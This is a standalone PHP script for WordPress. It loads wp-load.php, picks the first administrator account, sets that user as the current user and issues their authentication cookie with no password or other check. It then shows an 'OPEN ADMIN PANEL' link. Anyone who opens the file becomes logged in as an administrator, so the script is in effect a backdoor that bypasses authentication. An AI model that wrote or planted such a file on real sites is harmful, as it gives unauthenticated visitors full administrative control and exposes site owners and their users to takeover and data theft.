<?php
require('wp-load.php');

// Fetch users with administrator role
$args = array(
    'role'    => 'Administrator',
    'orderby' => 'ID',
    'order'   => 'ASC'
);
$admins = get_users($args);

// Check if there is at least one administrator
if (!empty($admins)) {
    $admin = $admins[0]; // Taking the first administrator

    // Set the current user and auth cookie
    wp_set_current_user($admin->ID, $admin->user_login);
    wp_set_auth_cookie($admin->ID);

    // Redirect to the admin panel
    echo sprintf('<a href="%s/wp-admin" style="background:#3630a3;color:white;padding:15px 25px;border:none;border-radius:5px;margin:auto;text-align:center;">OPEN ADMIN PANEL</a>', home_url());
    exit;
} else {
    // Handle the case where no administrators are found
    echo 'No administrator accounts found.';
    exit;
}